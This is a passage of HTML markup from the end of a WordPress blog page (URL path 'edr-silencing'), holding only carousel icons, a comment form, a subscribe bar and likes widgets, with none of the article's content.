										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"></path>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
							</span>
						</a>
												<a href="https://ipurple.team/2026/01/12/edr-silencing/#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"></path>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea name="comment" class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea" id="jp-carousel-comment-form-comment-field" placeholder="Write a Comment..."></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field">
															</fieldset>
																											</div>
													<input type="submit" name="submit" class="jp-carousel-comment-form-button" id="jp-carousel-comment-form-button-submit" value="Post Comment">
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="https://ipurple.team/2026/01/12/edr-silencing/#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"></path>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	
						<div id="actionbar" dir="ltr" class="actnbr-pub-creatio-2 actnbr-has-follow actnbr-has-actions">
		<ul>
								<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-comment" href="https://ipurple.team/2026/01/12/edr-silencing/#comments">
							<svg class="gridicon gridicons-comment" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M12 16l-5 5v-5H5c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2h14c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2h-7z"></path></g></svg>							<span>Comment						</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-reblog" href="https://ipurple.team/2026/01/12/edr-silencing/">
							<svg class="gridicon gridicons-reblog" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M22.086 9.914L20 7.828V18c0 1.105-.895 2-2 2h-7v-2h7V7.828l-2.086 2.086L14.5 8.5 19 4l4.5 4.5-1.414 1.414zM6 16.172V6h7V4H6c-1.105 0-2 .895-2 2v10.172l-2.086-2.086L.5 15.5 5 20l4.5-4.5-1.414-1.414L6 16.172z"></path></g></svg><span>Reblog</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
								<a class="actnbr-action actnbr-actn-follow " href="https://ipurple.team/2026/01/12/edr-silencing/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="https://ipurple.team/2026/01/12/edr-silencing/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
							<div class="actnbr-popover tip tip-top-left actnbr-notice" id="follow-bubble">
							<div class="tip-arrow"></div>
							<div class="tip-inner actnbr-follow-bubble">
															<ul>
											<li class="actnbr-sitename">
			<a href="https://ipurple.team/">
				<img loading="lazy" alt="" src="https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50" class="avatar avatar-50" height="50" width="50">				Purple Team			</a>
		</li>
										<div class="actnbr-message no-display"></div>
									<form method="post" action="https://subscribe.wordpress.com/" accept-charset="utf-8" style="display: none;">
																						<div class="actnbr-follow-count">Join 111 other subscribers</div>
																					<div>
										<input type="email" name="email" placeholder="Enter your email address" class="actnbr-email-field" aria-label="Enter your email address">
										</div>
										
										
										
										
																				<div class="actnbr-button-wrap">
											<button type="submit" value="Sign me up">
												Sign me up											</button>
										</div>
									</form>
									<li class="actnbr-login-nudge">
										<div>
											Already have a WordPress.com account? <a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F01%252F12%252Fedr-silencing%252F">Log in now.</a>										</div>
									</li>
								</ul>
															</div>
						</div>
					</li>
							<li class="actnbr-ellipsis actnbr-hidden">
				<svg class="gridicon gridicons-ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M7 12c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2zm12-2c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm-7 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2z"></path></g></svg>				<div class="actnbr-popover tip tip-top-left actnbr-more">
					<div class="tip-arrow"></div>
					<div class="tip-inner">
						<ul>
								<li class="actnbr-sitename">
			<a href="https://ipurple.team/">
				<img loading="lazy" alt="" src="https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50" class="avatar avatar-50" height="50" width="50">				Purple Team			</a>
		</li>
								<li class="actnbr-folded-follow">
										<a class="actnbr-action actnbr-actn-follow " href="https://ipurple.team/2026/01/12/edr-silencing/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="https://ipurple.team/2026/01/12/edr-silencing/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
								</li>
														<li class="actnbr-signup"><a href="https://wordpress.com/start/">Sign up</a></li>
							<li class="actnbr-login"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F01%252F12%252Fedr-silencing%252F">Log in</a></li>
																<li class="actnbr-shortlink">
										<a href="https://wp.me/pffK4K-pW">
											<span class="actnbr-shortlink__text">Copy shortlink</span>
											<span class="actnbr-shortlink__icon"><svg class="gridicon gridicons-checkmark" height="16" width="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M9 19.414l-6.707-6.707 1.414-1.414L9 16.586 20.293 5.293l1.414 1.414"></path></g></svg></span>
										</a>
									</li>
																<li class="flb-report">
									<a href="https://wordpress.com/abuse/?report_url=https://ipurple.team/2026/01/12/edr-silencing/" target="_blank" rel="noopener noreferrer">
										Report this content									</a>
								</li>
															<li class="actnbr-reader">
									<a href="https://wordpress.com/reader/blogs/225397078/posts/1608">
										View post in Reader									</a>
								</li>
															<li class="actnbr-subs">
									<a href="https://subscribe.wordpress.com/">Manage subscriptions</a>
								</li>
																<li class="actnbr-fold"><a href="https://ipurple.team/2026/01/12/edr-silencing/">Collapse this bar</a></li>
														</ul>
					</div>
				</div>
			</li>
		</ul>
	</div>
	


	















	


	<div src="https://widgets.wp.com/likes/master.html?ver=20260217#ver=20260217" scrolling="no" id="likes-master" name="likes-master" style="display:none;" data-original-tag="iframe">













<div src="https://public-api.wordpress.com/wp-admin/rest-proxy/#https://widgets.wp.com" style="display: none;" data-original-tag="iframe">






</div></div>
	<div id="likes-other-gravatars" role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
	 


		 	



<div class="comment-likes-overlay" style="display: none;"></div></body></html>